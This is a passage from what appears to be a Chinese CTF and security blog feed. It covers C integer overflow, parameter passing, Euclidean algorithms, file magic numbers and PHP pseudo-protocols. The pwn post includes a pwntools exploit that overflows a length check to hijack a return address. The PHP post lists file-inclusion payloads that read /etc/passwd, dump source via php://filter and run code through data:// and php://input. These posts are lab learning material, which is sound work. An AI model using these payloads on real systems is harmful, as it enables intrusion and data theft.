    <content type="text"><![CDATA[0x01 C语言的整数溢出机制整数溢出主要分为无符号整数溢出和有符号整数溢出。 无符号整型溢出对于unsigned整型溢出，C的规范是有定义的——“溢出后的数会以2^(8*sizeof(type))作模运算”，也就是说，如果一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模。 1234567#include &lt;stdio.h&gt;int main(int argc, const char * argv[]) &#123; // insert code here... unsigned char x; x = 128 + 130; printf(&quot;%d\n&quot;,x); &#125; 有符号整型溢出对于signed整型的溢出，C的规范定义是“undefined behavior”，虽然没有定义，各编译器可自己实现，但是大部分的溢出机制都是一样的。 有符号整型溢出又可分为向上溢出和向下溢出。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) – 1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出, 向下超出&lt;-2^(8k-1), 我们称之为向下溢出.对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。 12signed char x;x = 125 + 5; 上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。 12signed char x;x = (-100) + (-100); 上面代码会输出56，因为200的二进制为11001000，-200根据补码的算法，得出00111000即56。上面的两个例子无论是向上溢出还是向下溢出，绝对值都在相对于无符号整型能表示的范围内。对于signed char如果结果为400，超出了位数表示范围，取结果的低八位。 12signed char x;x = 200 + 200; 因此上面代码会输出-112。如果x的结果为负数且超出了255，则取结果的低八位，并进行补码的反向操作，减一后取反。 数据类型范围• 2015/06/09Visual C++ 32 位和 64 位编译器可识别本文后面的表中的类型。 • int (unsigned int) • __int8 (unsigned __int8) • __int16 (unsigned __int16) • __int32 (unsigned __int32) • __int64 (unsigned __int64) • short (unsigned short) • long (unsigned long) • long long (unsigned long long)如果其名称以两个下划线 (__) 开始，则数据类型是非标准的。下表中指定的范围均包含起始值和结束值。 0x02 _int_overflow检查安全机制运行一下，我们知道这是一个创建用户名和密码的程序，对用户名的长度和密码都有限制。我们ctrl+1 找到了system（”cat flag”） 找到溢出点 strcpy：危险函数unsigned __int8最大只能到达255 可是我们read（。。。）远超过255。 利用思路整数溢出要想利用到strcpy这一步，要么你输入的passwd长度&gt;3 &amp;&amp; &lt;=8，要么使passwd的长度过长，而v3最大可以存的长度为255，所以直接在v3处造成整数溢出进入else，整数溢出需要255，返回地址需要4字节，所以passwd长度达到259即可第一种passwd太短，无法利用进行改写程序流，我们使用第二种思路。程序中存在，可以将返回地址指向what_is_this()。 1.发现v3是8位无符号整数，则最大只能是255。但是read函数能读取的长度是0x199，远大于255，那就可以进行整型溢出，让passwd的长度是 260到264就可以了。根据无符号整形溢出规则，溢出则进行2^(8*sizeof(type))作模运算，passwd的长度是 260到264。2.我们将程序的返回地址覆盖为system（”cat flag”） EXP:12345678910111213141516171819from pwn import*p = process(&apos;./int_overflow&apos;)system_flag_addr = 0x804868Bp.recvuntil(&apos;choice:&apos;)p.sendline(&quot;1&quot;)p.recvuntil(&apos;username:\n&apos;)p.sendline(&quot;tutu&quot;)p.recvuntil(&apos;passwd:\n&apos;)payload = &apos;A&apos;*0x18 + p32(system_flag_addr)payload = payload.ljust(262,&apos;A&apos;) p.sendline(payload)p.interactive() Python ljust()方法Python 字符串 Python 字符串描述Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>CTF PWN</tag>
        <tag>二进制漏洞</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言函数传参方式]]></title>
    <url>%2F2019%2F10%2F13%2FC%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[今天在写扩展欧几里得算法的C语言函数时在实参与形参的参数传递时出了一些问题，于是复习一下C语言传参的方式两种传参方式，值传递与地址传递 值传递这种方式使用变量、常量、数组元素作为函数参数，实际是将实参的值复制到形参相应的存储单元中，即形参和实参分别占用不同的存储单元，这种传递方式称为“参数的值传递”或者“函数的传值调用”。 值传递的特点是单向传递，即主调函数调用时给形参分配存储单元，把实参的值传递给形参，在调用结束后，形参的存储单元被释放，而形参值的任何变化都不会影响到实参的值，实参的存储单元仍保留并维持数值不变 例子： 12345678910111213141516171819#include &lt;stdio.h&gt;/* 变量x、y为Swap函数的形式参数 */void Swap(int x, int y)&#123; int tmp; tmp = x; x = y; y = tmp; printf("x = %d, y = %d\n", x, y);&#125;int main(void)&#123; int a=10; int b=20; /*变量a、b为Swap函数的实际参数*/ Swap(a, b); printf("a = %d, b = %d\n", a, b); return 0;&#125; 在上面这个示例代码中，实参将值传递给形参，形参值发生互换后的值不能回传给主调函数。因此，主调函数中的数值不变，代码的运行结果为： x = 20, y = 10a = 10, b = 20 函数在调用时，隐含地把实参 a 的值赋值给了参数 x，而将实参 b 的值赋值给了参数 y，如下面的代码所示 1234/*将a的值赋值给x（隐含动作）*/int x = a;/*将a的值赋值给y（隐含动作）*/int y = b; 因此，之后在 Swap() 函数体内再也没有对 a、b 进行任何操作。而在 Swap() 函数体内交换的只是 x、y，并不是 a、b，当然，a、b 的值没有改变。整个 Swap() 函数调用是按照如下顺序执行的： 123456789/*将a的值赋值给x（隐含动作）*/int x = a;/*将a的值赋值给y（隐含动作）*/int y = b;int tmp;tmp = x;x = y;y = tmp;printf("x = %d, y = %d\n", x, y); 由此可见，函数只是把 a、b 的值通过赋值传递给 x、y，在函数 Swap() 中操作的只是 x、y 的值，并不是 a、b 的值，这也就是所谓的参数的值传递。 地址传递这种方式使用数组名或者指针作为函数参数，传递的是该数组的首地址或指针的值，而形参接收到的是地址，即指向实参的存储单元，形参和实参占用相同的存储单元，这种传递方式称为“参数的地址传递”。 地址传递的特点是形参并不存在存储空间，编译系统不为形参数组分配内存。数组名或指针就是一组连续空间的首地址。因此在数组名或指针作函数参数时所进行的传送只是地址传送，形参在取得该首地址之后，与实参共同拥有一段内存空间，形参的变化也就是实参的变化。 12345678910111213141516void Swap(int *px, int *py)&#123; int tmp; tmp = *px; *px = *py; *py = tmp; printf(&quot;*px = %d, *py = %d\n&quot;, *px, *py);&#125;int main(void)&#123; int a=10; int b=20; Swap(&amp;a, &amp;b); printf(&quot;a = %d, b = %d\n&quot;, a, b); return 0;&#125; 在上面的示例代码中，函数 void Swap(intpx,intpy) 中的参数 px、py 都是指针类型，在 main 函数中使用语句“Swap(&amp;a,&amp;b)”进行调用，该调用语句将 a 的地址(&amp;a)代入 px，b 的地址(&amp;b)代入 py。很显然，这里的函数调用有两个隐含操作：将 &amp;a 的值赋值给参数 px，将 &amp;b 的值赋值给参数 py，如下面的代码所示： 12px = &amp;a;py = &amp;b; 这里与值传递方式存在着很大的区别。在值传递方式中，传递的是变量 a、b 的内容（即在上面的值传递示例代码中，将 a、b 的内容传递给参数 x、y）；而这里的地址传递方式则是将变量 a、b 的地址值（&amp;a、&amp;b）传递给参数 px、py。因此，整个 Swap() 函数调用是按照如下顺序执行的： 123456789/*将&amp;a的值赋值给px（隐含动作）*/px = &amp;a; /* ← *//*将&amp;b的值赋值给py（隐含动作）*/py = &amp;b;int tmp;tmp = *px;*px = *py;*py = tmp;printf(&quot;*px = %d, *py = %d\n&quot;, *px, *py); 这样，有了前两行的隐含赋值操作，指针变量 px、py 的值已经分别是变量 a、b 的地址值（&amp;a、&amp;b）。接下来，对“px”“py”的操作当然也就是对 a、b 变量本身的操作了。所以 Swap() 函数中的交换操作就是对 a、b 值进行交换，这就是所谓的地址传递，运行结果为：*px = 20, *py = 10a = 20, b = 10引用传递： 1234567891011121314void swap(int &amp;x,int &amp;y)&#123; int temp = x; x = y; y = temp;&#125;void main()&#123; int a = 10, b = 20; swap(a, b); printf(&quot;a=%d\nb=%d\n&quot;, a, b);&#125; 指针传递： 123456789101112131415void swap(int *x,int *y)&#123; int temp = *x; *x = *y; *y = temp;&#125;void main()&#123; int a = 10, b = 20; swap(&amp;a, &amp;b); printf(&quot;a=%d\nb=%d\n&quot;, a, b);&#125; 参考：http://c.biancheng.net/view/371.html]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[欧几里得算法与扩展欧几里得算法]]></title>
    <url>%2F2019%2F10%2F13%2F%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95%E4%B8%8E%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[欧几里得算法欧几里德算法又称辗转相除法，用于计算两个整数a,b的最大公约数。 基本算法：设a=qb+r，其中a，b，q，r都是整数，则gcd(a,b)=gcd(b,r)，即gcd(a,b)=gcd(b,a%b)。 证明第一种证明：a可以表示成a = kb + r，则r = a mod b 假设d是a,b的一个公约数，则有 d|a, d|b，而r = a - kb，因此d|r 因此d是(b,a mod b)的公约数 假设d 是(b,a mod b)的公约数，则 d | b , d |r ，但是a = kb +r 因此d也是(a,b)的公约数 因此(a,b)和(b,a mod b)的公约数是一样的，其最大公约数也必然相等，得证 第二种证明：要证欧几里德算法成立，即证: gcd(a,b)=gcd(b,r),其中 gcd是取最大公约数的意思，r=a mod b 下面证 gcd（a，b）=gcd（b，r）设 c是a，b的最大公约数，即c=gcd（a，b），则有 a=mc，b=nc，其中m，n为正整数，且m，n互为质数 由 r= a mod b可知，r= a- qb 其中，q是正整数， 则 r=a-qb=mc-qnc=（m-qn）c b=nc,r=(m-qn)c，且n，（m-qn）互质（假设n，m-qn不互质，则n=xd, m-qn=yd 其中x,y,d都是正整数，且d&gt;1 则a=mc=(qx+y)dc, b=xdc,这时a,b 的最大公约数变成dc，与前提矛盾， 所以n ，m-qn一定互质） 则gcd（b,r）=c=gcd（a,b） 得证。 算法实现1234567891011121314151617#include&lt;stdio.h&gt;int gcd(int i,int j)&#123;//定义求最大公因数的函数，有两个参数i,j是要求最大公因数的两个数 while(j!=0) &#123; int r=j; //定义r为中间变量，用于交换i,j的值 j=i%j; //求i,j的余数 i=r; &#125; //根据欧几里得算法，gcd(i,j)=gcd(j,i%j)，在j！=0的条件下循环计算 return i;&#125;int main()&#123; int i,j; printf(&quot;input i,j:&quot;); scanf(&quot;%d %d&quot;,&amp;i,&amp;j); printf(&quot;gcd of i,j is:%d&quot;,gcd(i,j)); return 0;&#125; 递归： 1234567int gcd(int a,int b)&#123; if(b==0) return a; return gcd(b,a%b);&#125; 扩展欧几里得算法基本算法：对于不完全为 0 的非负整数 a，b，gcd（a，b）表示 a，b 的最大公约数，必然存在整数对 x，y ，使得 gcd（a，b）=ax+by。 证明证明：设 a&gt;b。 1，显然当 b=0，gcd（a，b）=a。此时 x=1，y=0； 2，ab!=0 时 设 ax1+by1=gcd(a,b); bx2+(a mod b)y2=gcd(b,a mod b); 根据朴素的欧几里德原理有 gcd(a,b)=gcd(b,a mod b); 则:ax1+by1=bx2+(a mod b)y2; 即:ax1+by1=bx2+(a-(a/b)b)y2=ay2+bx2-(a/b)by2; 根据恒等定理得：x1=y2; y1=x2-(a/b)*y2; 这样我们就得到了求解 x1,y1 的方法：x1，y1 的值基于 x2，y2. 上面的思想是以递归定义的，因为 gcd 不断的递归求解一定会有个时候 b=0，所以递归可以结束。 当 b=0 时存在 x , y 为最后一组解，而每一组的解可根据后一组得到。所以第一组的解 x , y 必然存在 算法实现根据上面的证明，在实现的时候采用递归做法 先递归进入下一层，等到到达最后一层即 b=0 时就返回x=1 , y=0 再根据 x=y’ , y=x’-a/b/y’ ( x’ 与 y’ 为下一层的 x 与 y ) 得到当层的解 不断算出当层的解并返回，最终返回至第一层，得到原解 12345678910111213141516171819int exgcd(int m,int n,int &amp;x,int &amp;y)//扩展欧几里得算法&#123; int x1,y1,x0,y0; x0=1; y0=0; x1=0; y1=1; x=0; y=1; //初始化x0,y0,x1,y1 int r=m%n; //令r=i mod j int q=(m-r)/n; while(r) &#123; x=x0-q*x1; y=y0-q*y1; x0=x1; y0=y1; x1=x; y1=y; //x0=y1,y0=x1-(m/n)y1 m=n; n=r; r=m%n; q=(m-r)/n; &#125; return n;&#125; 递归： 1234567891011121314int exgcd(int a,int b,int &amp;x,int &amp;y)&#123; if(b==0) &#123; x=1; y=0; return a; &#125; int r=exgcd(b,a%b,x,y); int t=x; x=y; y=t-a/b*y; return r;&#125; 应用：（1）求解不定方程； （2）求解模线性方程（线性同余方程）； （3）求解模的逆元； 求解逆元1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;int exgcd(int m,int n,int &amp;x,int &amp;y)//扩展欧几里得算法&#123; int x1,y1,x0,y0; x0=1; y0=0; x1=0; y1=1; x=0; y=1; //初始化x0,y0,x1,y1 int r=m%n; //令r=i mod j int q=(m-r)/n; while(r) &#123; x=x0-q*x1; y=y0-q*y1; x0=x1; y0=y1; x1=x; y1=y; //x0=y1,y0=x1-(m/n)y1 m=n; n=r; r=m%n; q=(m-r)/n; &#125; //可以求出x,y的值 return n;&#125;int mod_reverse(int a,int n)//ax=1(mod n) 求a的逆元x &#123; int d,x,y; d=exgcd(a,n,x,y); //调用扩展欧几里得算法求最大公因数 if(d==1) //如果做大公因数是1，gcd(a,n)=1则存在逆元 return (x%n+n)%n; //求a的逆相当于求解ax=1(mod n),这个方程可以转化为ax-my=1, //然后套用二元一次方程的方法，用扩展欧几里得算法求得一组x0,y0和gcd else return -1;&#125;int main()&#123; int i,j; printf(&quot;input a,n(ax=1(mod n)):&quot;) ; scanf(&quot;%d%d&quot;,&amp;i,&amp;j); printf(&quot;mod_reverse a is:%d&quot;,mod_reverse(i,j)); return 0;&#125; 求解不定方程exgcd 解不定方程（使用不将a与b转为互质的方法） 对于 ax+by=c 的不定方程，设 r=gcd(a,b) 当 c%r!=0 时无整数解 当 c%r=0 时，将方程右边 *r/c 后转换为 ax+by=r 的形式 可以根据扩展欧几里得算法求得一组整数解 x0 , y0 而这只是转换后的方程的解，原方程的一组解应再 *c/r 转变回去 （如 2x+4y=4 转换为 2x+4y=2 后应再将解得的 x , y 乘上2） 则原方程解为 x1=x0c/r , y1=x0c/r 通解 x=x1+b/rt , y=y1-a/rt ，其中 t 为整数 证明： 将 x , y 带入方程得 ax+ab/rt+by-ab/rt=c ax+by=c 此等式恒成立 得证 这里 b/r 与 a/r 为最小的系数，所以求得的解是最多最全面的 证明： 为了推出证明中的 ax+by=c ，且想达到更小的系数，只能将 b/r 与 a/r 同除以一个数 s 而 b/r 与 a/r 互质，且 s 为整数，则 s=1 ，不影响通解 那么 b/r 与 a/r 就为最小的系数 得证 123456789bool linear_equation(int a,int b,int c,int &amp;x,int &amp;y)&#123; int d=exgcd(a,b,x,y); if(c%d) return false; int k=c/d; x*=k; y*=k; //求得的只是其中一组解 return true;&#125;]]></content>
      <categories>
        <category>数论</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>算法</tag>
        <tag>数论</tag>
        <tag>欧几里得算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见文件头与文件尾]]></title>
    <url>%2F2019%2F10%2F11%2F%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E4%B8%8E%E6%96%87%E4%BB%B6%E5%B0%BE%2F</url>
    <content type="text"><![CDATA[文件头文件尾总结 12345678910111213141516171819202122232425262728293031JPEG (jpg)， 文件头：FFD8FF 文件尾：FF D9 PNG (png)， 文件头：89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3B ZIP Archive (zip)， 文件头：504B0304 文件尾：50 4Bkdmv 文件头：4B444D56TIFF (tif)， 文件头：49492A00 文件尾：Windows Bitmap (bmp)， 文件头：424D 文件尾：CAD (dwg)， 文件头：41433130 文件尾：Adobe Photoshop (psd)， 文件头：38425053 文件尾：Rich Text Format (rtf)， 文件头：7B5C727466 文件尾：XML (xml)， 文件头：3C3F786D6C 文件尾：HTML (html)， 文件头：68746D6C3EEmail [thorough only] (eml)， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D546864 各类文件的文件头标志 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465661、从Ultra－edit-32中提取出来的附件:文件格式分析器JPEG (jpg)，文件头：FFD8FFPNG (png)，文件头：89504E47GIF (gif)，文件头：47494638TIFF (tif)，文件头：49492A00Windows Bitmap (bmp)，文件头：424DCAD (dwg)，文件头：41433130Adobe Photoshop (psd)，文件头：38425053Rich Text Format (rtf)，文件头：7B5C727466XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EEmail [thorough only] (eml)，文件头：44656C69766572792D646174653AOutlook Express (dbx)，文件头：CFAD12FEC5FD746FOutlook (pst)，文件头：2142444EMS Word/Excel (xls.or.doc)，文件头：D0CF11E0MS Access (mdb)，文件头：5374616E64617264204AWordPerfect (wpd)，文件头：FF575043Postscript (eps.or.ps)，文件头：252150532D41646F6265Adobe Acrobat (pdf)，文件头：255044462D312EQuicken (qdf)，文件头：AC9EBD8FWindows Password (pwl)，文件头：E3828596ZIP Archive (zip)，文件头：504B0304RAR Archive (rar)，文件头：52617221Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920Real Audio (ram)，文件头：2E7261FDReal Media (rm)，文件头：2E524D46MPEG (mpg)，文件头：000001BAMPEG (mpg)，文件头：000001B3Quicktime (mov)，文件头：6D6F6F76Windows Media (asf)，文件头：3026B2758E66CF11MIDI (mid)，文件头：4D546864 2、从winhex中取出的文件头列表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305File Type ExtensionsHeaderJPEG jpg;jpeg 0xFFD8FFPNG png 0x89504E470D0A1A0AGIF gif GIF8TIFF tif;tiff 0x49492A00TIFF tif;tiff 0x4D4D002ABit map bmp BMAOL ART art 0x4A47040E000000AOL ART art 0x4A47030E000000PC Paintbrush pcx 0x0A050108Graphics Metafile wmf 0xD7CDC69AGraphics Metafile wmf 0x01000900Graphics Metafile wmf 0x02000900Enhanced Metafile emf 0x0100000058000000Corel Draw cdr CDRCAD dwg 0x41433130Adobe Photoshop psd 8BPSRich Text Format rtf rtfXML xmlHTML html;htm;PHP;php3;php4;phtml;shtml typeEmail eml Delivery-date:Outlook Express dbx 0xCFAD12FEOutlookpst!BDNMS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1MS Access mdb;mda;mde;mdt Standard JWordPerfect wpd 0xFF575043OpenOffice Writer sxw writerOpenOffice Calc sxc calcOpenOffice Math sxm mathOpenOffice Impress sxi impressOpenOffice Draw sxd drawAdobe FrameMaker fm &lt;MAKERFILEPostScript eps.or.ps;ps;eps %!PS-AdobeAdobe Acrobat pdf %PDF-1.Quicken qdf 0xAC9EBD8FQuickBooks Backup qbb 0x458600000600Sage sly.or.srt.or.slt;sly;srt;slt0x53520100Sage Backup 1 SAGEBACKUPLotus WordPro v9 lwp 0x576F726450726FLotus 123 v9 123 0x00001A00051004Lotus 123 v5 wk4 0x00001A0002100400Lotus 123 v3 wk3 0x00001A0000100400Lotus 123 v1 wk1 0x2000604060Windows Password pwl 0xE3828596ZIP Archive zip;jar 0x504B0304ZIP Archive (outdated) zip 0x504B3030RAR Archive rar Rar!GZ Archive gz;tgz 0x1F8B08BZIP Archive bz2 BZhARJ Archive arj 0x60EA7-ZIP Archive 7z 7z集'Wave wav WAVEAVI avi AVIReal Audio ram;ra .ra?0Real Media rm .RMFMPEG mpg;mpeg 0x000001BAMPEG mpg;mpeg 0x000001B3Quicktime mov moovWindows Media asf 0x3026B2758E66CF11MIDI mid MThdWin32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZWin16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZELF Executable elf;; 0x7F454C4601010100各种文件类型文件头标志位详细列表FFD8FFFE00, .JPEG;.JPE;.JPG, "JPGGraphic File"FFD8FFE000, .JPEG;.JPE;.JPG, "JPGGraphic File"474946383961, .gif, "GIF 89A"474946383761, .gif, "GIF 87A"424D, .bmp, "Windows Bitmap"4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;.cpl;.x32, "Executable File"504B0304, .zip, "Zip Compressed"3A42617365, .cnt, ""D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, "MS Compound Document v1 or Lotus Approach APRfile"0100000058000000, .emf, ""03000000C466C456, .evt, ""3F5F0300, .gid;.hlp;.lhp, "Windows HelpFile"1F8B08, .gz, "GZ Compressed File"28546869732066696C65, .hqx, ""0000010000, .ico, "Icon File"4C000000011402, .lnk, "Windows LinkFile"25504446, .pdf, "Adobe PDF File"5245474544495434, .reg, ""7B5C727466,.rtf, "Rich Text Format File"lh, .lzh, "Lz compression file"MThd, .mid, ""0A050108, .pcx, ""25215053, .eps, "Adobe EPS File"2112, .ain, "AIN Archive File"1A02, .arc, "ARC/PKPAK Compressed 1"1A03, .arc, "ARC/PKPAK Compressed 2"1A04, .arc, "ARC/PKPAK Compressed 3"1A08, .arc, "ARC/PKPAK Compressed 4"1A09, .arc, "ARC/PKPAK Compressed 5"60EA, .arj, "ARJ Compressed"41564920, .avi, "Audio Video Interleave(AVI)"425A68, .bz;.bz2, "Bzip Archive"49536328, .cab, "Cabinet File"4C01, .obj, "Compiled Object Module"303730373037, .tar;.cpio, "CPIO ArchiveFile"4352555348, .cru;.crush, "CRUSH ArchiveFile"3ADE68B1, .dcx, "DCX Graphic File"1F8B, .gz;.tar;.tgz, "Gzip ArchiveFile"91334846, .hap, "HAP Archive File"3C68746D6C3E,.htm;.html, "HyperText Markup Language 1"3C48544D4C3E,.htm;.html, "HyperText Markup Language 2"3C21444F4354, .htm;.html, "HyperText MarkupLanguage 3"100, .ico, "ICON File"5F27A889, .jar, "JAR Archive File"2D6C68352D,.lha, "LHA Compressed"20006040600, .wk1;.wks, "Lotus 123 v1 Worksheet"00001A0007800100, .fm3, "Lotus 123 v3 FMTfile"00001A0000100400, .wk3, "Lotus 123 v3Worksheet"20006800200, .fmt, "Lotus 123 v4 FMTfile"00001A0002100400, .wk4, "Lotus 123 v5"5B7665725D, .ami, "Lotus Ami Pro"300000041505052, .adx, "Lotus ApproachADX file"1A0000030000, .nsf;.ntf, "Lotus NotesDatabase/Template"4D47582069747064, .ds4, "MicrografixDesigner 4"4D534346, .cab, "Microsoft CAB FileFormat"4D546864, .mid, "Midi Audio File"000001B3, .mpg;.mpeg, "MPEG Movie"0902060000001000B9045C00, .xls, "MS Excel v2"0904060000001000F6055C00, .xls, "MS Excel v4"7FFE340A,.doc, "MS Word"1234567890FF, .doc, "MS Word 6.0"31BE000000AB0000, .doc, "MS Word forDOS 6.0"1A00000300001100, .nsf, "NotesDatabase"7E424B00, .psp, "PaintShop Pro Image File"504B0304, .zip, "PKZIP Compressed"89504E470D0A, .png, "PNG Image File"6D646174, .mov, "QuickTime Movie"6D646174, .qt, "Quicktime MovieFile"52617221, .rar, "RAR Archive File"2E7261FD, .ra;.ram, "Real AudioFile"EDABEEDB, .rpm, "RPM Archive File"2E736E64, .au, "SoundMachine AudioFile"53495421, .sit, "Stuffit v1 ArchiveFile"53747566664974, .sit, "Stuffit v5Archive File"1F9D, .z, "TAR Compressed ArchiveFile"49492A, .tif;.tiff, "TIFF (Intel)"4D4D2A,.tif;.tiff, "TIFF (Motorola)"554641, .ufa, "UFA Archive File"57415645666D74, .wav, "Wave Files"D7CDC69A,.wmf, "Windows Meta File"4C000000, .lnk, "Windows Shortcut (LinkFile)"504B3030504B0304, .zip, "WINZIPCompressed"FF575047, .wpg, "WordPerfectGraphics"FF575043, .wp, "WordPerfect v5 orv6"3C3F786D6C,.xml, "XML Document"FFFE3C0052004F004F0054005300540055004200, .xml, "XML Document(ROOTSTUB)"3C21454E54495459, .dtd, "XML DTD"5A4F4F20, .zoo, "ZOO Archive File" 转载自：http://www.cnblogs.com/lwy-kitty/p/3928317.htmlhttps://blog.csdn.net/zhembrace/article/details/52717559]]></content>
      <categories>
        <category>安全杂项</category>
      </categories>
      <tags>
        <tag>CTF 安全杂项</tag>
        <tag>文件结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP伪协议]]></title>
    <url>%2F2019%2F10%2F11%2FPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[文件包含漏洞利用的前提1.web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入；2.用户能够控制包含文件的参数，被包含的文件可被当前页面访问；在使用文件包含漏洞时，必须要能知道其绝对路径方法： 在包含文件处，查看其返回的错误的信息 伪协议种类123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 伪协议后文件必须是绝对路径 file条件：allow_url_fopen: off/on allow_url_include: off/on 12Linux ：http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd 绝对路径Windows ：http://192.168.6.128:8001/vulnerabilities/fi/?page=file:///C:\DVWA-master\vulnerabilities\fi\1.txt 绝对路径 php123456php://伪协议，主要为php://input与php://filterphp://input：将POST输入流当做PHP代码执行。其只allow_url_include参数的影响，allow_url_fopen开关与此伪协议无关。php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区php://filter伪协议：不受 allow_url_fopen与allow_url_include参数的影响 123456http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/resource=./1.txt 相对路径http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/resource=file:///C:\DVWA-master\vulnerabilities\fi\1.txt 绝对路径http://127.0.0.1/FI/LFI.php?file=php://filter/resource=file:///etc/passwd此协议主要用于读取php源代码时会用到http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=./1.txt 以base64编码将文件内容输出 zip条件：allow_url_fopen: off/on allow_url_include: off/on 1 、现将要执行 php 代码写好并且命名为 a.txt，将 a.txt 进行 zip 压缩，命名为 a.zip，如果可以上传 zip 文件便直接上传，如若不能可将 a.zip 命名为 a.jpg 上传； 2 、将 a.php 直接压缩成 a.bz2 12http://127.0.0.1/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.zip%23a.txt http://127.0.0.1/FI/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.jpg%23a.txt phar条件：allow_url_fopen: off/on allow_url_include: off/on php 版本大于等于php5.3.0 data1234allow_url_fopen: on allow_url_include: onhttp://192.168.6.128:8001/vulnerabilities/fi/?page=data://test/plain,&lt;?php phpinfo();?&gt;http://192.168.6.128:8001/vulnerabilities/fi/?page=data://test/plain;base64,PD9waHAgcGhwaW5mbygpPz4= input1234条件：allow_url_fopen:off/on allow_url_include：onhttp://127.0.0.1/LFI.php?file=php://input 用post方式提交这个数据 &lt;?php phpinfo()?&gt; http123allow_url_fopen与allow_url_include同时开启。缺一不可http://localhost/test.php?file=http://www.baidu.com 文件包含 百度杯”CTF比赛 2017 二月场include&lt;?php show_source(__FILE__); if(isset($_REQUEST[&apos;path&apos;])){ include($_REQUEST[&apos;path&apos;]); }else{ include(&apos;phpinfo.php&apos;); }发现已经直接包含了phpinfo()。既然是文件包含错误，首先搜索了一下allow_url_include，发现是处于打开的状态。既然 allow_url_include打开，意味着直接能使php://input用包含post中的代码。不多说，直接先查看一下目录下的文件: 发现一个可疑文件dle345aae.php，cat一下参考链接：https://blog.csdn.net/Wu000999/article/details/101925271]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP伪协议</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基本的栈溢出]]></title>
    <url>%2F2019%2F10%2F08%2F%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
